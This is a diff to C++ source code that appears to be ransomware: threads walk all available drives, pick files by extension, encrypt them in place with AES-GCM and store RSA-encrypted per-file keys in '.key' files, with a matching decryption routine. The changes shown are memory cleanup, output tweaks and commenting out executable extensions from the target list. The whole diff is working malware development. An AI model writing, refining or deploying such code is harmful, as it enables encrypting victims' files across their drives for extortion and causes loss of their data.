@@ -221,10 +221,10 @@ set<wstring>* get_wanted_extentions() {
 	extentions->insert(L".7z");
 	extentions->insert(L".rar");
 	// Executables
-	extentions->insert(L".exe");
+	/*extentions->insert(L".exe");
 	extentions->insert(L".msi");
 	extentions->insert(L".bin");
-	extentions->insert(L".iso");
+	extentions->insert(L".iso");*/
 
 	return extentions;
 }
@@ -277,6 +277,7 @@ contain specific extensions adding their full path to a queue for consumption
 by the path_consumer_thread
 */
 void enc_path_producer_thread(p_producer_bundle& p_bundle) {
+	/* Cleanup at end */
 	set<wstring>* ignore_folders = get_ignore_folders();
 	set<wstring>* wanted_extentions = get_wanted_extentions();
 	vector<wstring>* drives = get_available_drives();
@@ -318,13 +319,21 @@ void enc_path_producer_thread(p_producer_bundle& p_bundle) {
 			}
 			catch (const filesystem_error& ex)
 			{
-				cout << "PROBLEM PATH - " << dir->path() << endl;
-				cout << ex.what() << '\n';
+				printf("PROBLEM PATH - %s\n", dir->path());
+				printf("%s\n", ex.what());
 			}
 		}
 	}
 	// Notify we are done producing
 	flag.fetch_add(1, memory_order_release);
+
+	/* Clean up */
+	delete ignore_folders;
+	delete wanted_extentions;
+	delete drives;
+	ignore_folders = NULL;
+	wanted_extentions = NULL;
+	drives = NULL;
 }
 
 /* 
@@ -396,11 +405,12 @@ void enc_key_consumer_thread(enc_k_consumer_bundle& k_bundle) {
 
 			wprintf(L"Encrypting key for %s\n", &path[0]);
 
-			path = path + L".key";
+			path = path + L".key";	// Get the original file path
 			rsa.encrypt_key(path, aes_key_and_tag, 32+16);
 
-			delete aes_key_and_tag;
-			aes_key_and_tag = NULL;
+			/* Clean up */
+			//delete aes_key_and_tag;
+			//aes_key_and_tag = NULL;
 		}
 	} while (items_left || k_doneConsumer.fetch_add(1, memory_order_acq_rel) + 1 == k_consumer_count);
 
@@ -459,13 +469,18 @@ void dec_path_producer_thread(p_producer_bundle& p_bundle) {
 			}
 			catch (const filesystem_error& ex)
 			{
-				cout << "PROBLEM PATH - " << dir->path() << endl;
-				cout << ex.what() << '\n';
+				printf("PROBLEM PATH - %s\n", dir->path());
+				printf("%s\n", ex.what() );
 			}
 		}
 	}
 	// Notify we are done producing
 	flag.fetch_add(1, memory_order_release);
+
+	delete ignore_folders;
+	delete drives;
+	ignore_folders = NULL;
+	drives = NULL;
 }
 
 void dec_path_consumer_thread(dec_p_cons_bundle& p_bundle) {
@@ -497,7 +512,9 @@ void dec_path_consumer_thread(dec_p_cons_bundle& p_bundle) {
 
 			wprintf(L"Decrypting file: %s\n", &path[0]);
 
-			aes.in_place_decrypt(path, aes_key_gcm_tag + 32);
+			aes.in_place_decrypt(path, aes_key_gcm_tag + 32);	// Tag is last 16 bytes
 		}
 	} while (items_left || p_doneConsumer.fetch_add(1, memory_order_acq_rel) + 1 == p_consumer_count);
+
+	rsa.free_all();
 }
